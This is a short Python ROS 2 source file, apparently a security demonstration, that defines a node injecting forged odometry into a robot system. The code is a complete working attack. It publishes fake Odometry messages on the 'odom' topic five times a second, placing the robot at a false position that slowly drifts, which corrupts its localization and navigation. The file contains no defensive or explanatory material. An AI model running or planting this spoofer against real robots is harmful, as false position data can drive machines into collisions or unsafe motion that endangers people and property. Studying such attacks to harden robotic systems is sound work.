# security_examples/odom_spoofer.py
import rclpy
from rclpy.node import Node
from nav_msgs.msg import Odometry
from geometry_msgs.msg import Pose, Point, Quaternion

class OdomSpooferNode(Node):
    def __init__(self):
        super().__init__('odom_spoofer')
        self.publisher_ = self.create_publisher(Odometry, 'odom', 10)
        timer_period = 0.2
        self.timer = self.create_timer(timer_period, self.timer_callback)
        self.get_logger().warn('!!! Odometry Spoofer Node ACTIVE!!!')
        self.x_pos = 10.0 # Teleport to a fake location

    def timer_callback(self):
        odom_msg = Odometry()
        odom_msg.header.stamp = self.get_clock().now().to_msg()
        odom_msg.header.frame_id = 'odom'
        odom_msg.child_frame_id = 'base_footprint'

        # Publish a fake, static position far away
        odom_msg.pose.pose.position.x = self.x_pos
        odom_msg.pose.pose.position.y = 10.0
        odom_msg.pose.pose.orientation.w = 1.0

        self.publisher_.publish(odom_msg)
        self.x_pos += 0.1 # Make it drift slowly

def main(args=None):
    rclpy.init(args=args)
    odom_spoofer = OdomSpooferNode()
    rclpy.spin(odom_spoofer)
    odom_spoofer.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()